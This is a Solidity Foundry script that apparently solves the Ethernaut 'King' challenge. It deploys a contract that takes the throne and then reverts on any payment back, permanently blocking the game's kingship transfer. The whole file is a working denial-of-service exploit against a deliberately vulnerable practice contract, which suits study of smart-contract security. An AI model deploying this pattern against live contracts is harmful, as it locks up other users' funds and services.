// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";             


contract KingScript is Script {

    King public king;

    constructor() {
        king = King(payable(vm.envAddress("KING_INSTANCE")));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        
        // 0.0011 ether
        uint256 prize = king.prize();
        console.log("Prize: ", prize);

        vm.startBroadcast(pk);
        new KingExecutor{value: prize}(king);
        vm.stopBroadcast();
    }

    // forge script script/king.s.sol:KingScript --broadcast
}

contract KingExecutor {
    King public king;

    constructor(King _king) payable {
        king = _king;
        payable(king).call{value: msg.value}("");
    }

    receive() external payable {
        payable(king).transfer(msg.value);
    }
}



